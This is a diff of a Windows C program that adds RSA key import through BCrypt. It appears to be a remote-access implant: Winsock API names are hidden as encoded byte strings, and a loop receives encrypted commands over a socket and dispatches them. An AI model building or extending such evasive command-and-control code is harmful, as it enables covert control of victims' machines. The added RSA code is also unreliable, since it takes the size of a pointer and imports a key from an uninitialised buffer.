@@ -107,11 +107,11 @@ int main()
         return 0;
     }
 
-
     // RSA initialisation
     BCRYPT_ALG_HANDLE rsaAlgorithm = NULL;
     BCRYPT_KEY_HANDLE rsaKey = NULL;
-
+    BYTE *rsaPbinput = HeapAlloc(GetProcessHeap(), 0, 512);
+    ULONG rsaCbintput = sizeof(rsaPbinput);
 
     status = BCryptOpenAlgorithmProvider(&rsaAlgorithm, BCRYPT_RSA_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status))
@@ -120,20 +120,16 @@ int main()
     }
     status = BCryptImportKeyPair(
         rsaAlgorithm,
-        rsaKey,
+        NULL,
         BCRYPT_RSAPUBLIC_BLOB,
+        &rsaKey,
+        rsaPbinput,
+        512,
+        0);
+
+
+
         
-    );
-
-
-
-
-
-
-
-
-
-
 
     char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; // WSAStartup
     char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00}; // WSASocketA
@@ -201,8 +197,8 @@ int main()
                               ((unsigned char)rcvbuffer[3] << 24);
         recv_all(soc, received_message, cmdlen);
         decrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)received_message, (int)strlen(received_message),
-                                    rcvbuffer, sizeof(rcvbuffer), &cmdlen,
-                                    tag, sizeof(tag), &authInfo);
+                        rcvbuffer, sizeof(rcvbuffer), &cmdlen,
+                        tag, sizeof(tag), &authInfo);
         rcvbuffer[cmdlen] = '\0';
 
         if (rcvbuffer[0] == '#')
@@ -304,4 +300,3 @@ int send_all(SOCKET sock, char *buff, int len)
     }
     return total;
 }
-
